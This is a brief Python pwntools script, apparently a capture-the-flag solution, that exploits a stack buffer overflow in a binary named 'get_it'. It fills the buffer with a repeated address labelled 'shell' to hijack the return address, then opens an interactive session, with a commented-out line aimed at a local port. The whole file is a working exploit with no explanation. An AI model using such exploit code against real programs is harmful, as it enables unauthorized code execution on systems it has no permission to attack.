#!/usr/bin/env python

from pwn import *

shell = 0x4005b6

r = process('get_it')
#r = remote('127.0.0.1', 13337)
raw_input()
r.sendline(p64(shell) * (0x28 / 8))
r.interactive()
